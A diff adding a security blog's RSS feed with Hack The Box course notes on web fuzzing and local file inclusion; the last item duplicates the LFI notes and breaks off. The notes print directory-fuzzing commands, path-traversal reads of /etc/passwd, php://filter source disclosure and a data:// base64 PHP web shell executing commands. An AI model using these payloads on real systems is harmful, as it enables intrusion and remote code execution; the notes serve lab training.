@@ -1,0 +1,532 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Web Security on Istark Cybersecurity Notes</title>
+        <link>https://istaarkk.github.io/posts/web-security/</link>
+        <description>Recent content in Web Security on Istark Cybersecurity Notes</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Fri, 04 Apr 2025 15:24:19 +0200</lastBuildDate><atom:link href="https://istaarkk.github.io/posts/web-security/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Advanced Web Fuzzing Techniques</title>
+        <link>https://istaarkk.github.io/posts/web-security/fuzzing/web-fuzzing-htb-course-notes-md/</link>
+        <pubDate>Fri, 04 Apr 2025 15:24:19 +0200</pubDate>
+        
+        <guid>https://istaarkk.github.io/posts/web-security/fuzzing/web-fuzzing-htb-course-notes-md/</guid>
+        <description>&lt;h2 id=&#34;overview&#34;&gt;Overview
+&lt;/h2&gt;&lt;p&gt;These notes cover the &lt;strong&gt;Web Fuzzing&lt;/strong&gt; course on HTB.&lt;/p&gt;
+&lt;h2 id=&#34;first-flag&#34;&gt;First Flag
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To find the first flag, we need to fuzz the site &lt;code&gt;http://address/FUZZ&lt;/code&gt; using &lt;strong&gt;Feroxbuster&lt;/strong&gt;, an open-source tool.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://94.237.61.202:58637/FUZZ -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;recursive-fuzzing-second-flag&#34;&gt;Recursive Fuzzing (Second Flag)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For recursive fuzzing (to get the second flag), use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://94.237.61.202:58637/recursive_fuzz -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;third-flag---gobuster-or-ffuf&#34;&gt;Third Flag - Gobuster or FFUF
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;HTB asks us to use &lt;strong&gt;Gobuster&lt;/strong&gt; for this flag, but we can also use &lt;strong&gt;ffuf&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://83.136.251.168:55827/get.php?x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;FUZZ -w /root/SecLists/Discovery/Web-Content/common.txt -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;vhost-fuzzing&#34;&gt;Vhost Fuzzing
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For virtual host fuzzing, add the host like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;94.237.61.202:39228\tinlanefreight.htb&amp;#39;&lt;/span&gt; | sudo tee -a /etc/hosts
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Then, try the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://94.237.61.202:39228 -H &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Host: FUZZ.inlanefreight.htb&amp;#34;&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Results:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ADMIN &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 31ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Admin &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 34ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 100, Words: 4, Lines: 2, Duration: 19ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;awmdata &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 104, Words: 4, Lines: 2, Duration: 22ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ipdata &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 102, Words: 4, Lines: 2, Duration: 15ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;web-beans &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Status: 200, Size: 108, Words: 4, Lines: 2, Duration: 15ms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;fuzzing-another-host&#34;&gt;Fuzzing another host
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To fuzz another host, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -u http://FUZZ.inlanefreight.com -w /root/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;hidden-directory-content-length&#34;&gt;Hidden Directory (Content-Length)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;To fuzz for a hidden directory based on content length:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.23:31915 -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php .html .gz -t &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Once you find a &lt;code&gt;.gz&lt;/code&gt; file, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -I http://83.136.254.23:31915/ur-hiddenmember/backup.tar.gz
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will give you the correct content length (22/28).&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;api-fuzzing&#34;&gt;API Fuzzing
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Use &lt;strong&gt;ffuf&lt;/strong&gt; for API fuzzing:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt -u http://94.237.51.84:37078/FUZZ -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Then use &lt;strong&gt;curl&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://94.237.51.84:37078/czcmdcvt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;final-step-finding-the-panel&#34;&gt;Final Step (Finding the Panel)
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For the final step, use:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.23:50543 -w /root/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php .html -t &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Once you find a panel, use &lt;strong&gt;ffuf&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -c -ic -t &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -w /root/SecLists/Discovery/Web-Content/common.txt -u http://83.136.254.23:50543/admin/panel.php?accessID&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;FUZZ -mc &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt; -fs &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;You will find &lt;code&gt;getaccess&lt;/code&gt;, which gives you a new host to fuzz.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        </item>
+        <item>
+        <title>LFI Exploitation Methods</title>
+        <link>https://istaarkk.github.io/posts/web-security/lfi/lfi-htb-academy-md/</link>
+        <pubDate>Fri, 04 Apr 2025 15:24:18 +0200</pubDate>
+        
+        <guid>https://istaarkk.github.io/posts/web-security/lfi/lfi-htb-academy-md/</guid>
+        <description>&lt;h2 id=&#34;file-inclusion&#34;&gt;File Inclusion:
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For the first information, use the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;../../../../etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will reveal &lt;strong&gt;ballen&lt;/strong&gt; as a username.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The first flag is located at:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;../../../../usr/share/flags/flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;basic-bypass&#34;&gt;Basic Bypass:
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Use the following payload for a basic bypass:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;....//....//....//....//flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;php-filter&#34;&gt;PHP Filter:
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Run &lt;strong&gt;feroxbuster&lt;/strong&gt; to find files on the server:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;feroxbuster -u http://83.136.254.158:57904 -w /root/SecLists/Discovery/Web-Content/common.txt -x .php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;You will find a file named &lt;code&gt;configure.php&lt;/code&gt;. Access it with a PHP filter payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://83.136.254.158:57904/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;php://filter/read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;convert.base64-encode/resource&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;configure
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will return a Base64-encoded file. After decoding it, you&amp;rsquo;ll see:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;realpath&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;realpath&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;SCRIPT_FILENAME&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP/1.0 403 Forbidden&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;die&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;location: /index.php&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$config &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_HOST&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;db.inlanefreight.local&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_USERNAME&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;root&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_PASSWORD&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}&amp;#39;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DB_DATABASE&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;php-wrappers&#34;&gt;PHP Wrappers:
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Use &lt;strong&gt;curl&lt;/strong&gt; to access sensitive files using PHP wrappers:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl http://94.237.57.90:46790/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;php://filter/read&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;convert.base64-encode/resource&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;../../../../etc/php/7.4/apache2/php.ini
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;To list files on the machine, use the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://94.237.54.201:36693/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;amp;cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ls%20/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;After locating the &lt;code&gt;.txt&lt;/code&gt; file, use &lt;code&gt;cat&lt;/code&gt; to read its contents:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http://94.237.54.201:36693/index.php?language&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;amp;cmd&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;cat%20/37809e2f8952f06139011994726d9ef1.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ol&gt;
+</description>
+        </item>
+        <item>
+        <title>LFI HTB Academy</title>
+        <link>https://istaarkk.github.io/posts/web-security/lfi-htb-academy/</link>
+        <pubDate>Sat, 01 Jun 2024 00:00:00 +0000</pubDate>
+        
+        <guid>https://istaarkk.github.io/posts/web-security/lfi-htb-academy/</guid>
+        <description>&lt;h2 id=&#34;file-inclusion&#34;&gt;File Inclusion:
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;For the first information, use the following payload:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;../../../../etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;This will reveal &lt;strong&gt;ballen&lt;/strong&gt; as a username.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;The first flag is located at:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;../../../../usr/share/flags/flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;basic-bypass&#34;&gt;Basic Bypass:
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Use the following payload for a basic bypass:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;....//....//....//....//flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;php-filter&#34;&gt;PHP Filter:
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;Run &lt;strong&gt;feroxbuster&lt;/strong&gt; to find files on the server:&lt;/p&gt;
